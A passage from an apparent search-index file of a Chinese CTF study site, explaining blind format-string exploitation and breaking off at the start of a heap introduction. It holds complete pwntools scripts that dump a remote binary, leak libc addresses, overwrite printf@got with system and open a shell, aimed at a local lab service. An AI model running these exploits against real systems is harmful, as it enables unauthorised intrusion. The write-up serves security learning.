\u8fdb\u884c\u8f93\u51fa\u5e76\u4e0d\u662f\u4e00\u4e2a\u5b57\u8282\u4e00\u4e2a\u5b57\u8282\u8f93\u51fa\uff0c\u800c\u662f\u4e00\u76f4\u8f93\u51fa\u76f4\u5230\u9047\u5230 \\x00 \u622a\u6b62\u7b26\u624d\u4f1a\u505c\u6b62\uff0c\u4e5f\u5c31\u662f\u6bcf\u6b21\u6cc4\u9732\u7684\u957f\u5ea6\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u53ef\u80fd\u5f88\u957f\u4e5f\u53ef\u80fd\u662f\u7a7a\u3002\u56e0\u4e3a .text \u6bb5\u5f88\u53ef\u80fd\u6709\u8fde\u7eed \\x00 \uff0c\u6240\u4ee5\u6cc4\u9732\u811a\u672c\u5904\u7406\u60c5\u51b5\u6709\uff1a \u9488\u5bf9\u6bcf\u6b21\u6cc4\u9732\u957f\u5ea6\u4e0d\u7b49\uff0caddr \u6839\u636e\u6bcf\u6b21\u6cc4\u9732\u957f\u5ea6\u52a8\u6001\u589e\u52a0\uff1b \u6cc4\u9732\u5b57\u7b26\u4e32\u53ef\u80fd\u4e3a\u7a7a\uff0c\u4e5f\u5c31\u662f\u5982\u4f55\u5904\u7406 \\x00 \uff1b \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\u662f\u6cc4\u9732\u7684\u8d77\u59cb\u5730\u5740\u5728\u54ea\u91cc\uff1f\u4ece\u5404\u4e2a\u5927\u4f6c\u6587\u7ae0\u5b66\u5230\u4e24\u79cd\u505a\u6cd5\uff1a\u4ece .text \u6bb5\u5f00\u59cb\uff1b\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\uff1b\u4e24\u79cd\u65b9\u6cd5\u6cc4\u9732\u51fa\u6765\u7a0b\u5e8f\uff0c\u5728 ida \u4e2d\u5448\u73b0\u6709\u5dee\u522b\u3002","title":"dump \u7a0b\u5e8f"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_7","text":"\u5148\u6765\u8bf4\u7701\u4e8b\u7684\uff0c \u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb \u3002\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9 32 \u4f4d\u548c 64 \u4f4d\u5404\u4e0d\u76f8\u540c\uff1a 32 \u4f4d\uff1a\u4ece 0x8048000 \u5f00\u59cb\u6cc4\u9732 64 \u4f4d\uff1a\u4ece 0x400000 \u5f00\u59cb\u6cc4\u9732 \u4e0b\u9762\u662f\u8fd9\u6761\u4f8b\u9898\u7684\u6cc4\u9732\u811a\u672c\uff0c\u7ed3\u5408\u6ce8\u89e3\u5206\u6790\u5982\u4f55\u5904\u7406\u4e0a\u9762\u63d0\u5230\u7684\u95ee\u9898\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii r = remote('127.0.0.1',10001) def leak(addr): payload = \"%9$s.TMP\" + p32(addr) r.sendline(payload) print \"leaking:\", hex(addr) r.recvuntil('right:') ret = r.recvuntil(\".TMP\",drop=True) print \"ret:\", binascii.hexlify(ret), len(ret) remain = r.recvrepeat(0.2) return ret # name r.recv() r.sendline('nameaaa') r.recv() # leak begin = 0x8048000 text_seg ='' try: while True: ret = leak(begin) text_seg += ret begin += len(ret) if len(ret) == 0: # nil begin +=1 text_seg += '\\x00' except Exception as e: print e finally: print '[+]',len(text_seg) with open('dump_bin','wb') as f: f.write(text_seg) \u6ce8\u89e3 \uff1a 19-21 \u884c\uff1a\u5904\u7406\u65e0\u5173\u6cc4\u9732\u7684\u7a0b\u5e8f\u6d41\u7a0b\u540e\uff0c\u8fdb\u5165\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u8f93\u5165\u72b6\u6001 24 \u884c\uff1a32 \u4f4d\u7cfb\u7edf\u52a0\u8f7d\u5730\u5740 9 \u884c\uff1a\"%9$s.TMP\" \u4e2d\u7684 .TMP \u65e2\u662f\u586b\u5145\u5bf9\u9f50\uff0c\u4e5f\u662f\u5206\u9694\u7b26\uff0c\u65b9\u4fbf\u540e\u9762\u5904\u7406\u6570\u636e 14 \u884c\uff1a\u4f7f\u7528binascii \u5c06\u6cc4\u6f0f\u51fa\u6765\u5b57\u7b26\u4e32\u6bcf\u4e00\u4e2a\u90fd\u4ece ascii \u8f6c\u6362\u4e3a \u5341\u516d\u8fdb\u5236\uff0c\u65b9\u4fbf\u663e\u793a 15 \u884c\uff1ar.recvrepeat(0.2) \u63a5\u53d7\u8fd4\u56de\u7684\u5783\u573e\u6570\u636e\uff0c\u65b9\u4fbf\u4e0b\u4e00\u8f6e\u7684\u8f93\u5165 30 \u884c\uff1a\u6cc4\u6f0f\u5730\u5740\u52a8\u6001\u589e\u52a0\uff0c\u5047\u5982\u6cc4\u6f0f 1 \u5b57\u8282\u5c31\u589e\u52a0 1 \uff1b\u6cc4\u6f0f 3 \u5b57\u8282\u5c31\u589e\u52a0 3 31-33 \u884c\uff1a\u5904\u7406\u6cc4\u6f0f\u957f\u5ea6\u4e3a 0 \uff0c\u4e5f\u5c31\u662f\u6570\u636e\u662f \\x00 \u7684\u60c5\u51b5\u3002\u5730\u5740\u589e\u52a0 1 \uff0c\u7a0b\u5e8f\u6570\u636e\u52a0 \\x00 \u8fd0\u884c\u4e4b\u540e\uff0c\u8010\u5fc3\u7b49\u5f85\u6cc4\u6f0f\u5b8c\u6210\u3002\u6cc4\u6f0f\u51fa\u6765\u7684\u7a0b\u5e8f\u662f\u4e0d\u80fd\u8fd0\u884c\u7684\uff0c\u4f46\u53ef\u4ee5\u5728 ida \u8fdb\u8fc7\u5904\u7406\u53ef\u4ee5\u8fdb\u884c\u5206\u6790\u3001\u627e plt \u3001got.plt \u7b49\u3002 \u5c06\u6cc4\u6f0f\u51fa\u6765\u7684\u7a0b\u5e8f\uff0c\u653e\u5165 ida \uff0c\u542f\u52a8\u65f6\u9009\u62e9 \u4ee5 binary file \u52a0\u8f7d \uff0c\u52fe\u9009 Load as code segment \uff0c\u5e76 \u8c03\u6574\u504f\u79fb\u4e3a\uff1a 0x8048000 \uff08\u5f00\u59cb\u6cc4\u9732\u7684\u5730\u5740\uff09\uff1a \u53ef\u4ee5\u901a\u8fc7 shift+F12 \u67e5\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\uff0c\u7136\u540e\u76f4\u63a5 F5 \u53cd\u7f16\u8bd1\uff1a \u57fa\u672c\u7ed3\u6784\u5df2\u7ecf\u51fa\u6765\u4e86\uff0c\u76f2\u6253\u6ca1\u6709\u6e90\u4ee3\u7801\uff0c\u5c31\u9700\u8981\u6839\u636e\u4f20\u5165\u53c2\u6570\u53bb\u5224\u65ad\u54ea\u4e2a sub_xxx \u662f\u54ea\u4e2a\u51fd\u6570\u4e86\u3002\u6bd4\u5982\u8f93\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684 sub_8048490 \u5c31\u662f printf \u3002","title":"\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#text","text":"\u7a0b\u5e8f\u542f\u52a8\u8fc7\u7a0b\uff1a \u4ece _start \u51fd\u6570\u5f00\u59cb\u5c31\u662f .text \u6bb5\uff0c\u53ef\u4ee5\u5728 ida \u4e2d\u6253\u5f00\u4e00\u4e2a\u6b63\u5e38\u7684 binary \u89c2\u5bdf text \u6bb5\u5f00\u5934\u7b2c\u4e00\u4e2a\u51fd\u6570\u5c31\u662f _stat \uff1a\uff08\u56fe\u4e3a 32 \u4f4d\u7a0b\u5e8f\uff09 \u5148\u7528 %p \u6cc4\u9732\u51fa\u6808\u4e0a\u6570\u636e\uff0c\u627e\u5230\u4e24\u4e2a\u76f8\u540c\u5730\u5740\uff0c\u800c\u4e14\u8fd9\u4e2a\u5730\u5740\u5f88\u9760\u8fd1\u7a0b\u5e8f\u52a0\u8f7d\u521d\u5730\u5740\uff0832\u4f4d\uff1a0x8048000\uff1b64\u4f4d\uff1a0x400000\uff09\u3002\u811a\u672c\u5982\u4e0b\uff1a from pwn import * import sys p = remote('127.0.0.1',10001) p.recv() p.sendline('nameaaa') p.recv() def where_is_start(ret_index=null): return_addr=0 for i in range(400): payload = '%%%d$p.TMP' % (i) p.sendline(payload) p.recvuntil('right:') val = p.recvuntil('.TMP') log.info(str(i*4)+' '+val.strip().ljust(10)) if(i*4==ret_index): return_addr=int(val.strip('.TMP').ljust(10)[2:],16) return return_addr p.recvrepeat(0.2) start_addr=where_is_start() \u6700\u540e\u5728\u504f\u79fb 1164 \u548c 1188 \u627e\u5230 text \u6bb5\u5730\u5740 0x8048510 \uff0c\u53ef\u4ee5\u5bf9\u6bd4\u4e0a\u56fe\uff0c\u4e0a\u56fe\u662f\u8fd9\u6761\u4f8b\u9898\u7684\u622a\u56fe\uff1a \u6cc4\u9732\u811a\u672c\u548c\u524d\u9762\u4e00\u6837\u53ea\u9700\u8981\u4fee\u6539\u4e00\u4e0b\u8d77\u59cb\u5730\u5740\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii context.log_level = 'info' r = remote('127.0.0.1',10001) def leak(addr): payload = \"%9$s.TMP\" + p32(addr) r.sendline(payload) print \"leaking:\", hex(addr) r.recvuntil('right:') ret = r.recvuntil(\".TMP\",drop=True) print \"ret:\", binascii.hexlify(ret), len(ret) remain = r.recvrepeat(0.2) return ret # name r.recv() r.sendline('nameaaa') r.recv() # leak begin = 0x8048510 #begin = 0x8048000 text_seg ='' try: while True: ret = leak(begin) text_seg += ret begin += len(ret) if len(ret) == 0: # nil begin +=1 text_seg += '\\x00' except Exception as e: print e finally: print '[+]',len(text_seg) with open('dump_bin_text','wb') as f: f.write(text_seg) \u5c06\u6cc4\u9732\u6587\u4ef6\u653e\u5165 ida \u5206\u6790\uff0c\u542f\u52a8\u65f6\u9009\u62e9 \u4ee5 binary file \u52a0\u8f7d \uff0c\u52fe\u9009 Load as code segment \uff0c\u5e76 \u8c03\u6574\u504f\u79fb\u4e3a\uff1a 0x8048510 \uff08\u5f00\u59cb\u6cc4\u9732\u5730\u5740\uff09\uff1a \u627e\u5230 main \u51fd\u6570\u5728 0x0804860B \uff0c\u9700\u8981\u5c06\u8fd9\u90e8\u5206\u5b9a\u4e49\u4e3a\u51fd\u6570\u624d\u80fd\u53cd\u7f16\u8bd1\uff0c\u53f3\u952e\u5730\u5740\u9694\u58c1\u7684\u540d\u79f0 loc_804860B \uff0ccreat function \u3002 \u7ea2\u8272\u90e8\u5206\u5c31\u662f\u6ca1\u6709\u6cc4\u9732\u51fa\u6765\u7684\u51fd\u6570\uff0c\u540e\u9762\u8ddf\u7684\u5c31\u662f\u51fd\u6570 plt \u5730\u5740\u3002 \u4e24\u79cd\u65b9\u6cd5\u5404\u6709\u4e0d\u540c\uff0c\u7ed3\u5408\u5b9e\u9645\u4f7f\u7528\u3002","title":"\u4ece .text \u6bb5\u5f00\u59cb"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_8","text":"\u7740\u91cd\u8bb0\u5f55 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \uff0c\u4e0d\u4e00\u6b65\u4e00\u6b65\u5206\u6790\u8fd9\u9053\u9898\u76ee\u6f0f\u6d1e\uff08\u8be6\u7ec6\u5206\u6790\uff1a \u9ed8\u5c0f\u897f \u535a\u5ba2\uff09\u3002\u8fd9\u9053\u9898\u76ee\u601d\u8def\u662f\uff1a \u786e\u5b9a printf \u7684 plt \u5730\u5740 \u901a\u8fc7\u6cc4\u9732 plt \u8868\u4e2d\u7684\u6307\u4ee4\u5185\u5bb9\u786e\u5b9a\u5bf9\u5e94\u7684 got.plt \u8868\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u7684 got.plt \u8868\u5730\u5740\u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u7684 printf \u7684\u51fd\u6570\u5730\u5740\u786e\u5b9a libc \u57fa\u5740\uff0c\u4ece\u800c\u83b7\u5f97 system \u5730\u5740 \u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4efb\u610f\u5199\u529f\u80fd\u5c06 printf \u7684 got.plt \u8868\u4e2d\u7684\u5730\u5740\u4fee\u6539\u4e3a system \u7684\u5730\u5740 send \u5b57\u7b26\u4e32 \u201c/bin/sh\u201d \uff0c\u90a3\u4e48\u5728\u8c03\u7528 printf(\u201c/bin/sh\u201d) \u7684\u65f6\u5019\u5b9e\u9645\u4e0a\u8c03\u7528\u7684\u662f system(\u201c/bin/sh;\u201d) \uff0c\u4ece\u800c\u6210\u529f\u83b7\u53d6shell","title":"\u89e3\u9898\u6d41\u7a0b"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#printf-plt","text":"\u5c06\u6cc4\u9732\u51fa\u6765\u7684\u7a0b\u5e8f\uff0c\u653e\u5165 ida \u4e2d\u5206\u6790\u83b7\u5f97\uff0c\u51fd\u6570\u540d\u540e\u534a\u622a\u5c31\u662f\u5730\u5740 0x8048490 \uff1a","title":"\u786e\u5b9a printf \u7684 plt \u5730\u5740"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#gotplt","text":"\u548c\u6cc4\u9732\u7a0b\u5e8f payload \u9ad8\u5ea6\u76f8\u4f3c\uff1a payload = \"%9$sskye\" + p32(printf_plt) p.sendline(payload) # \\xff\\x25 junk code p.recvuntil('right:\\xff\\x25') printf_got_plt = u32(p.recv(4)) \u6ce8\u89e3\uff1a \u4e3a\u4ec0\u4e48\u63a5\u6536 'right:\\xff\\x25' \uff1f right: \u662f\u56fa\u5b9a\u56de\u663e\uff0c\\xff\\x25 \u662f\u65e0\u7528\u5b57\u8282\u7801\u3002\u5b9e\u9645\u4e0a 0x8048490 \u7684\u6c47\u7f16\u662f\u8fd9\u6837\u7684\uff1a pwndbg> pdisass 0x8048490 \u25ba 0x8048490 <printf@plt> jmp dword ptr [0x804a018] <0xf7e4d670> 0x8048496 <printf@plt+6> push 0x18 0x804849b <printf@plt+11> jmp 0x8048450 # \u5b57\u8282\u7801 pwndbg> x /20wx 0x8048490 0x8048490 <printf@plt>: 0xa01825ff 0x18680804 0xe9000000 0xffffffb0 0x8048490 \u6307\u5411\u662f\u4e00\u6761\u8df3\u8f6c got.plt \u6307\u4ee4\uff0c\u6211\u4eec\u9700\u8981\u5176\u4e2d\u8df3\u8f6c\u7684\u76ee\u6807\u5730\u5740\u3002\\xff\\x25 \u5c31\u662f\u8df3\u8f6c\u6307\u4ee4\u7684\u5b57\u8282\u7801\uff0c\u6211\u4eec\u5c31\u8981\u5148\u63a5\u6536 2 \u5b57\u8282\u5783\u573e\u6570\u636e\uff0c\u7136\u540e\u518d\u63a5\u6536 4 \u5b57\u8282\u7684 got.plt \u5730\u5740\u3002","title":"\u6cc4\u9732 got.plt"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#printf","text":"\u6784\u9020\u65b9\u6cd5\u540c\u4e0a\uff0c\u4f46\u4e0d\u9700\u8981\u63a5\u6536 2 \u5b57\u8282\u5783\u573e\u6570\u636e\uff1a payload = \"%9$sskye\" + p32(printf_got_plt) p.sendline(payload) p.recvuntil('right:') printf_got = u32(p.recv(4))","title":"\u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#libc-system","text":"\u9898\u76ee\u6ca1\u6709\u7ed9\u51fa libc \u3002\u4ece\u6cc4\u9732\u51fa\u6765\u7684 printf@got \u53bb libcdatabase \u67e5\u8be2\u5176\u4ed6\u51fd\u6570\u504f\u79fb\u3002 printf:0x00049670 system:0x0003ada0","title":"\u6cc4\u9732 libc \u57fa\u5740&amp; system \u5730\u5740"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#printfgotplt","text":"payload = fmtstr_payload(7, {printf_got_plt: system_addr}) p.sendline(payload)","title":"\u4efb\u610f\u5199\u4fee\u6539 printf@got.plt"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#exp","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : leakmemory_remote.py from pwn import * import binascii context.log_level = 'debug' p = remote('127.0.0.1',10001) def leak(addr): payload = \"%9$s.TMP\" + p32(addr) p.sendline(payload) print \"leaking:\", hex(addr) p.recvuntil('right:') resp = p.recvuntil(\".TMP\") ret = resp[:-4:] print \"ret:\", binascii.hexlify(ret), len(ret) remain = p.recvrepeat(0.2) return ret printf_plt = 0x8048490 # name p.recv() p.sendline('nameaaa') p.recv() # leak printf@got.plt payload = \"%9$sskye\" + p32(printf_plt) p.sendline(payload) # \\xff\\x25 junk code p.recvuntil('right:\\xff\\x25') printf_got_plt = u32(p.recv(4)) log.info(\"printf_got_plt:\"+hex(printf_got_plt)) # leak printf@got payload = \"%9$sskye\" + p32(printf_got_plt) p.sendline(payload) p.recvuntil('right:') printf_got = u32(p.recv(4)) log.info(\"printf_got:\"+hex(printf_got)) # libcdatabase libc_base = printf_got - 0x00049670 log.info(\"libc_base:\"+hex(libc_base)) system_addr = libc_base + 0x0003ada0 log.info(\"system_addr:\"+hex(system_addr)) # overwrite payload = fmtstr_payload(7, {printf_got_plt: system_addr}) p.sendline(payload) p.sendline('/bin/sh\\x00') p.interactive()","title":"exp"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#64","text":"","title":"64 \u4f4d\u5229\u7528\u624b\u6cd5"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_9","text":"\u8fd8\u662f\u4f7f\u7528 32 \u4f4d\u7684\u4f8b\u9898\u6e90\u7801\uff0c\u7f16\u8bd1 64 \u4f4d\u7a0b\u5e8f\uff1a gcc -z execstack -fno-stack-protector -o leakmemory_64 leakmemory.c \u7528 socat \u6302\u5230\u7aef\u53e3 10001 \u4e0a\u90e8\u7f72\uff1a socat TCP4-LISTEN:10000,fork EXEC:./leakmemory \u5b9e\u9a8c\u73af\u5883\u5b8c\u6210\uff0c\u5982\u679c\u662f\u672c\u5730\u90e8\u7f72\u7684\u8bdd\uff0c\u7b49\u7b49\u5728 exp \u91cc\u9762\u5199 remote(\"127.0.0.1\",10000) \u6a21\u62df\u6ca1\u6709 binary \u7684\u8fdc\u7a0b\u76f2\u6253\u3002","title":"\u5b9e\u9a8c\u73af\u5883\u51c6\u5907"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_10","text":"\u586b\u5145 8 \u5b57\u8282\uff0c\u7136\u540e\u518d\u586b\u5165 %p \uff0c\u56de\u663e\u957f\u5ea6\u662f 8 \u5b57\u8282\u3002","title":"\u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_11","text":"\u6700\u540e\u786e\u8ba4\u504f\u79fb\u4e3a 8 \u3002","title":"\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#dump_1","text":"\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\uff0c\u6216\u8005\u4ece text \u6bb5\u5f00\u59cb\u53ef\u4ee5\u7684\u3002\u8fd9\u91cc\u4e0d\u518d\u627e text \u6bb5\u8d77\u59cb\u4f4d\u7f6e\uff0c\u76f4\u63a5\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\u6cc4\u9732\u3002\u4e24\u4e2a\u4f4d\u6570\u7a0b\u5e8f\u811a\u672c\u901a\u7528\u7684\uff0c\u6539\u4e00\u4e0b\u53c2\u6570\u5373\u53ef\u3002 64 \u4f4d\u7a0b\u5e8f\u52a0\u8f7d\u8d77\u59cb\u5730\u5740\u662f\uff1a0x400000 \uff0c\u4e0b\u9762\u662f\u5bf9\u6bd4\u56fe\uff1a \u811a\u672c\u8fd8\u662f\u90a3\u4e2a\u811a\u672c\uff0c\u6539\u4e00\u4e0b\u53c2\u6570\u5373\u53ef\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii context.log_level = 'info' #r = remote('127.0.0.1',10001) r = remote('127.0.0.1',10000) def leak(addr): payload = \"%9$s.TMP\" + p64(addr) r.sendline(payload) print \"leaking:\", hex(addr) r.recvuntil('right:') ret = r.recvuntil(\".TMP\",drop=True) print \"ret:\", binascii.hexlify(ret), len(ret) remain = r.recvrepeat(0.2) return ret # name r.recv() r.sendline('moxiaoxi') r.recv() # leak begin = 0x400000#0x8048000 text_seg ='' try: while True: ret = leak(begin) text_seg += ret begin += len(ret) if len(ret) == 0: # nil begin +=1 text_seg += '\\x00' except Exception as e: print e finally: print '[+]',len(text_seg) with open('dump_bin_64','wb') as f: f.write(text_seg) ida \u52a0\u8f7d\u53c2\u6570\u5982\u56fe\uff1a \u901a\u8fc7\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\uff0c\u8fd9\u91cc\u6ca1\u6709\u8bc6\u522b\u4e3a\u51fd\u6570\uff0c\u9700\u8981\u624b\u52a8\u521b\u5efa\u51fd\u6570\u3002\u5728 0x0400826 \u53f3\u952e creat function \uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u53cd\u6c47\u7f16\u4e86\u3002 \u70b9\u8fdb printf@plt \uff0c\u91cc\u9762\u662f\u8df3\u8f6c\u5230 printf@got.plt \u6307\u4ee4\uff0c\u4e5f\u5c31\u662f\u4ece ida \u77e5\u9053\u4e86\uff1a printf_plt = 0x4006B0 printf_got_plt = 0x601030 \u89e3\u9898\u601d\u8def\u4e0e 32 \u4f4d\u4e00\u81f4\uff0c\u5229\u7528\u811a\u672c\uff1a #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : leakmemory_64_remote.py from pwn import * import binascii context.log_level = 'debug' p = remote('127.0.0.1',10000) def leak(addr): payload = \"%9$s.TMP\" + p64(addr) p.sendline(payload) print \"leaking:\", hex(addr) p.recvuntil('right:') resp = p.recvuntil(\".TMP\") ret = resp[:-4:] print \"ret:\", binascii.hexlify(ret), len(ret) remain = p.recvrepeat(0.2) return ret printf_plt = 0x4006B0 printf_got_plt = 0x601030 # name p.recv() p.sendline('moxiaoxi') p.recv() # leak printf@got payload = \"%9$s.TMP\" + p64(printf_got_plt+1) p.sendline(payload) p.recvuntil('right:') printf_got = u64(p.recv(5).ljust(7,'\\x00')+'\\x00')<<8 log.info(\"printf_got:\"+hex(printf_got)) # libcdatabase libc_base = printf_got - 0x055800 log.info(\"libc_base:\"+hex(libc_base)) system_addr = libc_base + 0x045390 log.info(\"system_addr:\"+hex(system_addr)) one = p64(system_addr)[:2] two = p64(system_addr>>16)[:2] payload = \"%9104c%12$hn%54293c%13$hn\" + 'a'*7 payload += p64(printf_got_plt) + p64(printf_got_plt+2) p.sendline(payload) p.recv() p.sendline('/bin/sh\\x00') p.interactive()","title":"dump \u7a0b\u5e8f"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_12","text":"axb_2019_fmt32 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\uff0c\u5ffd\u7565\u63d0\u4f9b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5c31\u662f\u76f2\u6253\u9898\u76ee axb_2019_fmt64 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\uff0c\u5ffd\u7565\u63d0\u4f9b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5c31\u662f\u76f2\u6253\u9898\u76ee SuCTF2018 - lock2 \u4e3b\u529e\u65b9\u63d0\u4f9b\u4e86 docker \u955c\u50cf: suctf/2018-pwn-lock2","title":"\u66f4\u591a\u5b9e\u4f8b"},{"location":"fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_13","text":"ctf-wiki leak me pwn-\u76f2\u6253","title":"\u53c2\u8003"},{"location":"glibc-heap/Introduction_heap/","text":"\u5806\u6982\u8ff0 \u5185\u5bb9\u7edd\u5927\u90e8\u5206\u6765\u81eactf-wiki\uff0c\u6587\u7ae0\u7528\u4e8e\u81ea\u5df1\u5b66\u4e60\u8bb0\u5f55 \u4ec0\u4e48\u662f\u5806 \u5728\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c \u5806\u53ef\u4ee5\u63d0\u4f9b\u52a8\u6001\u5206\u914d\u7684\u5185\u5b58 \uff0c\u5141\u8bb8\u7a0b\u5e8f\u7533\u8bf7\u5927\u5c0f\u672a\u77e5\u7684\u5185\u5b58 ^1 \u3002\u5806\u5176\u5b9e\u5c31\u662f\u7a0b\u5e8f\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u4e00\u5757\u8fde\u7eed\u7684\u7ebf\u6027\u533a\u57df\uff0c\u5b83\u7531\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u65b9\u5411\u589e\u957f\u3002\u6211\u4eec\u4e00\u822c\u79f0\u7ba1\u7406\u5806\u7684\u90a3\u90e8\u5206\u7a0b\u5e8f\u4e3a\u5806\u7ba1\u7406\u5668\u3002 \u5806\u7ba1\u7406\u5668\u5904\u4e8e\u7528\u6237\u7a0b\u5e8f\u4e0e\u5185\u6838\u4e2d\u95f4\uff0c\u4e3b\u8981\u505a\u4ee5\u4e0b\u5de5\u4f5c \u54cd\u5e94\u7528\u6237\u7684\u7533\u8bf7\u5185\u5b58\u8bf7\u6c42\uff0c\u5411\u64cd\u4f5c\u7cfb\u7edf \u7533\u8bf7\u5185\u5b58 \uff0c\u7136\u540e\u5c06\u5176\u8fd4\u56de\u7ed9\u7528\u6237\u7a0b\u5e8f\u3002\u540c\u65f6\uff0c\u4e3a\u4e86\u4fdd\u6301\u5185\u5b58\u7ba1\u7406\u7684\u9ad8\u6548\u6027\uff0c \u5185\u6838\u4e00\u822c\u90fd\u4f1a\u9884\u5148\u5206\u914d\u5f88\u5927\u7684\u4e00\u5757\u8fde\u7eed\u7684\u5185\u5b58\uff0c\u7136\u540e\u8ba9\u5806\u7ba1\u7406\u5668\u901a\u8fc7\u67d0\u79cd\u7b97\u6cd5\u7ba1\u7406\u8fd9\u5757\u5185\u5b58\u3002\u53ea\u6709\u5f53\u51fa\u73b0\u4e86\u5806\u7a7a\u95f4\u4e0d\u8db3\u7684\u60c5\u51b5\uff0c\u5806\u7ba1\u7406\u5668\u624d\u4f1a\u518d\u6b21\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92 \u3002 \u7ba1\u7406\u7528\u6237\u6240\u91ca\u653e\u7684\u5185\u5b58 \u3002\u4e00\u822c\u6765\u8bf4\uff0c\u7528\u6237\u91ca\u653e\u7684\u5185\u5b58\u5e76\u4e0d\u662f\u76f4\u63a5\u8fd4\u8fd8\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u7684\uff0c\u800c\u662f\u7531\u5806\u7ba1\u7406\u5668\u8fdb\u884c\u7ba1\u7406\u3002\u8fd9\u4e9b\u91ca\u653e\u7684\u5185\u5b58\u53ef\u4ee5\u6765\u54cd\u5e94\u7528\u6237\u65b0\u7533\u8bf7\u7684\u5185\u5b58\u7684\u8bf7\u6c42\u3002 Linux \u4e2d\u65e9\u671f\u7684\u5806\u5206\u914d\u4e0e\u56de\u6536\u7531 Doug Lea 